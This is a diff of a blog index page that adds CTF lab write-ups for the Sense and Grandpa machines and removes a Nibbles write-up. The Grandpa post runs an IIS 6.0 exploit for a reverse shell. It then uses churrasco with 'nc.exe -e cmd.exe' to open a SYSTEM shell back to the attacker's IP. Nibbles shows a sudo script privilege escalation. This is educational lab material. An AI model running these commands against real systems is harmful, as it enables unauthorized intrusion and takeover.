@@ -71,6 +71,123 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Sense" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/24/Sense/" class="article-date">
+  <time class="dt-published" datetime="2022-07-25T01:23:10.000Z" itemprop="datePublished">2022-07-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/24/Sense/">Sense</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/24/Sense/nmap.png">
+the home page is a login page
+
+<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><img src="/2022/07/24/Sense/dir1.png">
+<img src="/2022/07/24/Sense/dir2.png">
+the changelog.txt shows some message that we may can use
+<img src="/2022/07/24/Sense/changelog.png">
+all php pages need login
+
+<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><p>the gobuster <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/121576425">knowledge</a></p>
+<pre><code>gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt
+</code></pre>
+<ul>
+<li>-k - 跳过SSL证书的验证</li>
+<li>-x <extensions> - 要检查的扩展名列表（如果有）<img src="/2022/07/24/Sense/gobuster.png">
+we can find a system-users.txt
+<img src="/2022/07/24/Sense/system-users.png"></extensions></li>
+</ul>
+<p>the password we can guess is the default page - pfsense<br>username: Rohit<br>password: company defaults—-pfsense<br>and we success<br><img src="/2022/07/24/Sense/pfsense.png"></p>
+<h5 id="search-sploit"><a href="#search-sploit" class="headerlink" title="search sploit"></a>search sploit</h5><p>we can find a 43560.py matches the pfsense 2.1.3<br>let’s have a try and we get a root access<br><img src="/2022/07/24/Sense/rootaccess.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/24/Sense/" data-id="cl6073erw0000dfcp3vruemkv" data-title="Sense" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Grandpa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/22/Grandpa/" class="article-date">
+  <time class="dt-published" datetime="2022-07-22T09:44:48.000Z" itemprop="datePublished">2022-07-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/22/Grandpa/">Grandpa</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/22/Grandpa/nmap.png">
+it looks like granny
+<img src="/2022/07/22/Grandpa/dirsearch.png">
+<img src="/2022/07/22/Grandpa/asp.png">
+
+<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><pre><code>davtest -url http://10.10.10.14
+</code></pre>
+<p>but it shows nothing can use<br><img src="/2022/07/22/Grandpa/davtest.png"></p>
+<h5 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h5><p>the iis 6.0 is too old,so we can use msf&#x2F;searchsploit to search some exploits<br><img src="/2022/07/22/Grandpa/searchsploit.png"></p>
+<h4 id="2-get-web-access"><a href="#2-get-web-access" class="headerlink" title="2.get web access"></a>2.get web access</h4><p>we can try to use <a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">script</a><br><img src="/2022/07/22/Grandpa/pyscript.png"></p>
+<pre><code>python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.16.10 8888
+</code></pre>
+<img src="/2022/07/22/Grandpa/webshell.png">
+but all users directory we all can't get in
+<img src="/2022/07/22/Grandpa/accessdeny.png">
+
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>we can try many path to write</p>
+<pre><code>echo test &gt; test.txt
+</code></pre>
+<p>but many directory failed<br>in the root directory,we can find a unique dir called wmpub<br><img src="/2022/07/22/Grandpa/wmpub.png"><br>and we can success write into this directory<br><img src="/2022/07/22/Grandpa/wmpubwrite.png"><br><code>icacles</code> shows that as well:<br><img src="/2022/07/22/Grandpa/icacls.png"><br>That Userss can <code>WD</code> decodes to write data&#x2F;add files.<br>use systeminfo and <a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">windows-exploit-suggester</a> to find if there is something can use<br>    pip2 install xlrd&#x3D;&#x3D;1.2.0<br>    python2 windows-exploit-suggester.py -i systeminfo.txt –database 2022-07-22-mssb.xls<br><img src="/2022/07/22/Grandpa/suggest1.png"><br><img src="/2022/07/22/Grandpa/suggest2.png"><br>but these don’t work<br>check the privs<br><img src="/2022/07/22/Grandpa/suggest2.png"><br><code>SEImpersonalPrivilege</code> is one I know to look out for. For modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, it’s better to start with <a target="_blank" rel="noopener" href="https://github.com/Re4son/Churrasco/">churrasco</a>.</p>
+<h5 id="churrasco"><a href="#churrasco" class="headerlink" title="churrasco"></a>churrasco</h5><p>first,make a smb directory and put the churrasco.exe into it<br><img src="/2022/07/22/Grandpa/smbpack.png"><br>second,use<code>impack-smbserver smb smb</code> to start a smb server to let the target machine get the churrasco.exe<br>we should made sure the Churrasco.exe file was in a directory called SMB on Kali machine.<br><img src="/2022/07/22/Grandpa/smbserver.png"><br>now we can use target machine to connect our smbshare <code>net use \\10.10.16.10\smb</code><br><img src="/2022/07/22/Grandpa/netuse.png"><br>once we connected,use <code>copy \\10.10.16.10\smb\churrasco.exe</code> and <code>copy \\10.10.16.10\smb\nc.exe</code><br><img src="/2022/07/22/Grandpa/smbcopy.png"><br><img src="/2022/07/22/Grandpa/smbcopy2.png"><br>Once the files are copied, execute churrasco with the following command: .\churrasco.exe “C:\wmpub\nc.exe -e cmd.exe 10.10.16.10 8999”<br>And we get the root access</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/22/Grandpa/" data-id="cl5zdl9n00000y5cp5m8vg19h" data-title="Grandpa" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Granny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/07/21/Granny/" class="article-date">
@@ -628,161 +745,12 @@ we can first see what's configured
 
 
   
-    <article id="post-Nibbles" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/07/14/Nibbles/" class="article-date">
-  <time class="dt-published" datetime="2022-07-14T10:10:31.000Z" itemprop="datePublished">2022-07-14</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/14/Nibbles/">Nibbles</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.75<br><img src="/2022/07/14/Nibbles/nmap.png" width="50%"></p>
-<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>in the website,it just has hello world,but in the source code,it hides a hint<br><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code><br>visit it</p>
-<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we use dirsearch to display its menu and we can find some pages that can visit<br><img src="/2022/07/14/Nibbles/dirsearch.png" width="50%"><br>when we visit some of them,we can get it’s machine menu<br>In exploring the resulting paths, &#x2F;nibbleblog&#x2F;content is interesting, and has dir lists enabled. Digging deeper, there’s a page at &#x2F;nibbleblog&#x2F;content&#x2F;private&#x2F;user.xml which reveals a user, admin, as well as the IPs that have tried to log in as it<br><img src="/2022/07/14/Nibbles/user.png" width="50%"></p>
-<h5 id="logging-into-admin"><a href="#logging-into-admin" class="headerlink" title="logging into admin"></a>logging into admin</h5><p>visit <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/admin.php">http://10.10.10.75/nibbleblog/admin.php</a><br>we don’t have the creds,in most writeups says they guess the password or use the information get from  <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles">http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles</a></p>
-<h5 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h5><p>in the settings page, we konw that the site is nibbleblog 4.0.3<br>we can use searchspolit to find some poc<br>it has a fileupload exploit<br>we use msf to get webshell<br><img src="/2022/07/14/Nibbles/msf.png" width="50%"><br>after this,we can get user.txt<br><img src="/2022/07/14/Nibbles/userflag.png" width="50%"></p>
-<h4 id="3-getting-root"><a href="#3-getting-root" class="headerlink" title="3.getting root"></a>3.getting root</h4><h5 id="first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner"><a href="#first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner" class="headerlink" title="first get a fully interactive shell using the python pty.spawn one liner"></a>first get a fully interactive shell using the python pty.spawn one liner</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<img src="/2022/07/14/Nibbles/root1.png" width="50%">
-so we can try run monitor.sh and the color of text changed
-<img src="/2022/07/14/Nibbles/root2.png" width="50%">
-
-<p><a target="_blank" rel="noopener" href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d">sudo trick</a><br>from this article,we can learn that how to use sudo-enabled files to open system-level tools like &#x2F;bin&#x2F;bash.<br>If you have write and execute permissions to a file that runs with elevated privileges, you can add commands such as system calls to get what you want.<br>we can use the next command to get the root</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#! /bin/bash&quot; &gt; monitor.sh</span><br><span class="line">echo &quot;/bin/bash -i&quot; &gt;&gt; monitor.sh</span><br><span class="line">sudo ./monitor.sh</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5v6ykmz0006yacp2bh067jz" data-title="Nibbles" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/07/13/first-blog/" class="article-date">
-  <time class="dt-published" datetime="2022-07-13T14:35:48.000Z" itemprop="datePublished">2022-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/13/first-blog/">first_blog</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="h1-标题"><a href="#h1-标题" class="headerlink" title="h1 标题"></a>h1 标题</h1><h2 id="h2-标题"><a href="#h2-标题" class="headerlink" title="h2 标题"></a>h2 标题</h2><h3 id="h3-标题"><a href="#h3-标题" class="headerlink" title="h3 标题"></a>h3 标题</h3><h4 id="h4-标题"><a href="#h4-标题" class="headerlink" title="h4 标题"></a>h4 标题</h4><h5 id="h5-标题"><a href="#h5-标题" class="headerlink" title="h5 标题"></a>h5 标题</h5><h6 id="h6-标题"><a href="#h6-标题" class="headerlink" title="h6 标题"></a>h6 标题</h6><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><hr>
-<hr>
-<hr>
-<h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><p><strong>This is bold text</strong></p>
-<p><strong>This is bold text</strong></p>
-<p><em>This is italic text</em></p>
-<p><em>This is italic text</em></p>
-<p><del>Strikethrough</del></p>
-<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>无序</p>
-<ul>
-<li>Create a list by starting a line with <code>+</code>, <code>-</code>, or <code>*</code></li>
-<li>Sub-lists are made by indenting 2 spaces:<ul>
-<li>Marker character change forces new list start:<ul>
-<li>Ac tristique libero volutpat at</li>
-</ul>
-<ul>
-<li>Facilisis in pretium nisl aliquet</li>
-</ul>
-<ul>
-<li>Nulla volutpat aliquam velit</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Very easy!</li>
-</ul>
-<p>有序</p>
-<ol>
-<li><p>Lorem ipsum dolor sit amet</p>
-</li>
-<li><p>Consectetur adipiscing elit</p>
-</li>
-<li><p>Integer molestie lorem at massa</p>
-</li>
-<li><p>You can use sequential numbers…</p>
-</li>
-<li><p>…or keep all the numbers as <code>1.</code></p>
-</li>
-</ol>
-<p>Start numbering with offset:</p>
-<ol start="57">
-<li>foo</li>
-<li>bar</li>
-</ol>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Inline <code>code</code></p>
-<p>Indented code</p>
-<pre><code>// Some comments
-line 1 of code
-line 2 of code
-line 3 of code
-</code></pre>
-<p>Block code “fences”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sample text here...</span><br></pre></td></tr></table></figure>
-
-<p>Syntax highlighting</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="keyword">function</span> (<span class="params">bar</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> bar++;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
-<p><img src="/creds.jpg" alt="creds"></p>
-<img src="/2022/07/13/first-blog/creds.jpg" class title="This is an image">
-
-<div align="center">
-<img src="/2022/07/13/first-blog/creds.jpg" width="40%" height="30%">
-</div>
-
-<div align="left">
-<img src="/2022/07/13/first-blog/creds.jpg" width="30%">
-</div>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5v6ykn00009yacpf7ij565o" data-title="first_blog" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -813,6 +781,14 @@ line 3 of code
       <ul>
         
           <li>
+            <a href="/2022/07/24/Sense/">Sense</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/22/Grandpa/">Grandpa</a>
+          </li>
+        
+          <li>
             <a href="/2022/07/21/Granny/">Granny</a>
           </li>
         
@@ -822,14 +798,6 @@ line 3 of code
         
           <li>
             <a href="/2022/07/18/Delivery/">Delivery</a>
-          </li>
-        
-          <li>
-            <a href="/2022/07/17/Horizontall/">Horizontall</a>
-          </li>
-        
-          <li>
-            <a href="/2022/07/16/Previse/">Previse</a>
           </li>
         
       </ul>
